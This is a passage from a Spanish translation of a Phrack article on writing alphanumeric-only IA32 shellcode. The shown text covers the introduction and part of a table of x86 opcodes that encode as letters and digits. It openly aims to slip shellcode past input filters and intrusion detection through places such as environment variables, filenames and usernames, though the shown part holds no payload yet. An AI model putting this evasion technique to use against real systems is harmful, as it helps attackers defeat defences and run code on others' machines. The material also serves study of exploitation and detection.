                             ==Phrack Inc.==

             Volumen 0x0b, Numero 0x39, Archivo #0x0f de 0x12

|=---------=[ Escribiendo shellcodes alfanumericos para ia32 ]=----------=|
|=-----------------------------------------------------------------------=|
|=--------------------------=[ rix@hert.org ]=---------------------------=|



----| Introduccion

Hoy, mas y mas exploits necesitan ser escritos usando assembler,
particularmente para escribir shellcodes clasicos (para buffer overflows,
o ataques format string,...).

Varios programas ahora alcanzan poderosos filtrados input, usando funciones
como strspn() o strcspn(): previene a la gente de insertar facilmente
shellcodes en diferentes buffers.
En la misma forma, observamos mas y mas IDS detectando secuencias de opcodes
sospechosas, algunas de ellas indicando la presencia de un shellcode.

Una forma de evadir tales tecnicas de coincidencia de patron es usar
polimorfismo, como usando herramientas tales como ADMmutate de K2.
Otra forma de hacer esto va a ser presentada aqui: trataremos de escribir
shellcodes IA32 no filtrables, usando solo caracteres alfanumericos: mas
precisamente, usaremos solo caracteres como '0'->'9','A'->'Z' y 'a'->'z'.

Si podemos escribir tales shellcodes alfanumericos, podremos guardar nuestros
shellcodes casi en donde sea! Vamos a enumerar algunas posibilidades
interesantes:
- inputs filtrados
- variables de entorno
- comandos clasicos, instrucciones y parametros desde protocolos usuales
- nombres de archivo y directorios
- nombres de usuario y passwords
- ...



----| Las instrucciones utilizables

Antes de empezar a pensar acerca de tecnicas particulares, vamos a echar una
mirada primero a las instrucciones de IA32 que seran interesantes para
nosotros.

Primero que todo, algunas convenciones (desde las referencias Intel) que
usaremos en nuestros arrays sumarios:

 <r8>          : indica un registro byte.
 <r32>         : indica un registro doubleword.
 <r/m8>        : indica un registro byte o un byte desde memoria (a traves
                 de un puntero).
 <r/m32>       : indica un registro doubleword o un doubleword desde
                 memoria (a traves de un puntero).
 </r>          : indica que el byte de instruccion es seguido de
                 varios posibles bytes operando. Uno de esos bytes, el
                 "ModR/M byte", nos permite especificar la forma de
                 direccionamiento usada, con la ayuda de campos de 3 bits.

                     ModR/M byte:                 
                     
                    7 6 5 4 3 2 1 0 
                   +---+-----+-----+
                   |mod|  r  | r/m |
                   +---+-----+-----+
                   
                 En este caso, la </r> nos indica que el ModR/M byte
                 contendra un registro operando y un registro o memoria
                 operando.
 <imm8>        : indica un valor de byte inmediato.
 <imm32>       : indica un valor doubleword inmediato.
 <disp8>       : indica un desplazamiento firmado de 8 bits.
 <disp32>      : indica un desplazamiento firmado de 32 bits.
 <...>         : indica que la instruccion necesita posiblemente algunos
                 operandos (eventualmente encodeados en varios bytes operando)

OPCODES ALFANUMERICOS:

Ahora, vamos a recordar todas las instrucciones con opcodes alfanumericos:

opcode hexadecimal | char | instruccion                    | interesante
-------------------+------+--------------------------------+------------
30 </r>            | '0'  | xor <r/m8>,<r8>                | SI
31 </r>            | '1'  | xor <r/m32>,<r32>              | SI
32 </r>            | '2'  | xor <r8>,<r/m8>                | SI
33 </r>            | '3'  | xor <r32>,<r/m32>              | SI
34 <imm8>          | '4'  | xor al,<imm8>                  | SI
35 <imm32>         | '5'  | xor eax,<imm32>                | SI
36                 | '6'  | ss:  (Prefijo Segment Override)|
37                 | '7'  | aaa                            |
38 </r>            | '8'  | cmp <r/m8>,<r8>                | SI
39 </r>            | '9'  | cmp <r/m32>,<r32>              | SI
                   |      |                                |
41                 | 'A'  | inc ecx                        | SI
42                 | 'B'  | inc edx                        | SI
43                 | 'C'  | inc ebx                        | SI
44                 | 'D'  | inc esp                        | SI
45                 | 'E'  | inc ebp                        | SI
46                 | 'F'  | inc esi                        | SI
47                 | 'G'  | inc edi                        | SI
48                 | 'H'  | dec eax                        | SI
49                 | 'I'  | dec ecx                        | SI
4A                 | 'J'  | dec edx                        | SI
4B                 | 'K'  | dec ebx                        | SI
4C                 | 'L'  | dec esp                        | SI
4D                 | 'M'  | dec ebp                        | SI
4E                 | 'N'  | dec esi                        | SI
4F                 | 'O'  | dec edi                        | SI
50                 | 'P'  | push eax                       | SI
51                 | 'Q'  | push ecx                       | SI
52                 | 'R'  | push edx                       | SI
53                 | 'S'  | push ebx                       | SI
54                 | 'T'  | push esp                       | SI
55                 | 'U'  | push ebp                       | SI
56                 | 'V'  | push esi                       | SI
57                 | 'W'  | push edi                       | SI
58                 | 'X'  | pop eax                        | SI
59                 | 'Y'  | pop ecx                        | SI
5A                 | 'Z'  | pop edx                        | SI
                   |      |                                |
61                 | 'a'  | popa                           | SI
62 <...>           | 'b'  | bound <...>                    |
63 <...>           | 'c'  | arpl <...>                     |
64                 | 'd'  | fs:  (Prefijo Segment Override)|
65                 | 'e'  | gs:  (Prefijo Segment Override)|
66                 | 'f'  | o16: (Tama~o operando Override)| SI
67                 | 'g'  | a16:(Tama~o direccion Override)|
68 <imm32>         | 'h'  | push <imm32>                   | SI
69 <...>           | 'i'  | imul <...>                     | 
6A <imm8>          | 'j'  | push <imm8>                    | SI
6B <...>           | 'k'  | imul <...>                     |
6C <...>           | 'l'  | insb <...>                     |
6D <...>           | 'm'  | insd <...>                     |
6E <...>           | 'n'  | outsb <...>                    |
6F <...>           | 'o'  | outsd <...>                    |
70 <disp8>         | 'p'  | jo <disp8>                     | SI
71 <disp8>         | 'q'  | jno <disp8>                    | SI
72 <disp8>         | 'r'  | jb <disp8>                     | SI
73 <disp8>         | 's'  | jae <disp8>                    | SI
